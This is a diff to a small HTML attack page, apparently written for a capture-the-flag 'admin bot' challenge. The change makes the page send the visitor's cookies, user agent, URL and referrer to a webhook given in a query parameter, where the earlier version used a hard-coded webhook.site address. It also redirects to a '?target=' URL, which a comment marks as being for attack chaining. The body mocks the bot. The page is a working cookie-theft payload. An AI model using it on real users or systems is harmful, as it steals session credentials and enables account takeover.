@@ -4,25 +4,37 @@
   <meta charset="UTF-8">
   <title>Gotcha!</title>
   <script>
-    fetch('https://webhook.site/your-unique-url', {
-      method: "POST",
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        cookies: document.cookie,
-        userAgent: navigator.userAgent,
-        location: window.location.href,
-        referrer: document.referrer
-      })
-    });
+    // Parse webhook parameter from URL
+    function getWebhookUrl() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get('webhook');
+    }
 
+    // Send info to the webhook if set
+    const webhook = getWebhookUrl();
+    if (webhook) {
+      fetch(webhook, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          referrer: document.referrer
+        })
+      });
+    }
+
+    // Optional: redirect if ?target= is set (for attack chaining)
     const params = new URLSearchParams(window.location.search);
-    if(params.has('target')) {
+    if (params.has('target')) {
       window.location = params.get('target');
     }
   </script>
 </head>
 <body>
-  <h1>Hello, Admin Bot!</h1>
-  <p>If you see this, the attack worked.</p>
+  <h1>👋 Gotcha, Admin Bot!</h1>
+  <p>Even AI does a better job than you.</p>
+  @A
 </body>
 </html>
